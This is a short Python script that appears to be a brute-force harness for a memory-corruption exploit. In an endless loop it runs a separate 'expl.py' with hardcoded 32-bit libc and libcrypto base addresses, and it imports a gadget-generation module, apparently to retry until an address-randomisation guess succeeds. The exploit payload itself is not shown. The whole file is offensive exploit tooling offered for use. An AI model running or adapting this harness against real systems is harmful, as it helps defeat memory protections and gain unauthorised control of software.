import sys
import os
import time
import multiprocessing
import gengadgets

if __name__ == '__main__':
    i = 0
    while 1:
        i = i + 1
        print ('Start %d' % i);
        libc_base = '0xf76cd000'
        libcrypto_base = '0xf750c000'
        os.system('python expl.py ' + libc_base + ' ' + libcrypto_base)
        print 'Process end.'
        time.sleep(5)

